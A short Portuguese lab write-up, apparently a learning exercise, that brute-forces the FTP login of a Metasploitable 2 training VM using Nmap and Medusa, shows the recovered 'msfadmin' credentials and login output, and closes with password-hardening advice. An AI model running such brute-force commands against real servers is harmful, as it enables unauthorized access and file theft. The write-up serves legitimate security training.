# Simulando ataque de brute force de senhas com Medusa e Kali Linux
## Objetivo 
Testar a segurança do servidor Metasploitable, uma máquina criada para aprendizado, simulando um ataque de força bruta no servidor FTP para descobrir uma senha fraca.
## Ferramentas Utilizadas
-Kali Linux (máquina vítima)
-Metasploitable 2 (máquina vítima) - IP: 192.168.56.102
-Nmap
-Medusa
-FTP
## Passo 1 - Reconhecimento com Nmap 
Descobri as portas abertas no alvo:
'''bash nmap -sV 192.168.56.102
Encontrei a porta 21 aberta, serviço FTP (vsFTPd 2.3.4)

## Passo 2 - Ataque de Força Bruta com Medusa
criei os arquivos de usuários e senhas:
- usuários.txt
- msfadmin
* senhas
* msfadmin
* 123456
* password
* 12345
* admin
  Executei com Medusa:
- medusa -h 192.168.56.102
- usuários.txt -P senhas.txt -M ftp
  RESULTADO ENCONTRADO
  ACCOUNT FOUND: [ftp]
  Host: 192.168.56.102
  User: msfadmin
  Password: msfadmin

  ## Passo 3 - Acesso ao Servidor
  Com a credencial descoberta, acessei via FTP:
  ftp 192.168.56.102
  login: msfadmin
  senha: msfadmin
  retorno:
  230 Login successful

  -Ao listar os aquivos encontrei a pasta vulnerable com ls.

  # CONCLUSÃO
  O ataque funcionou porque a senha era fraca e igual ao nome do usuário. Em um servidor real, isso permitiria que um atacante roubasse arquivos.
  Como corrigir
. Não usar senha igual ao nome
. Usar senhas fortes
. Bloquear o acesso após várias tentaivas erradas
. Usar autenticação de dois fatores
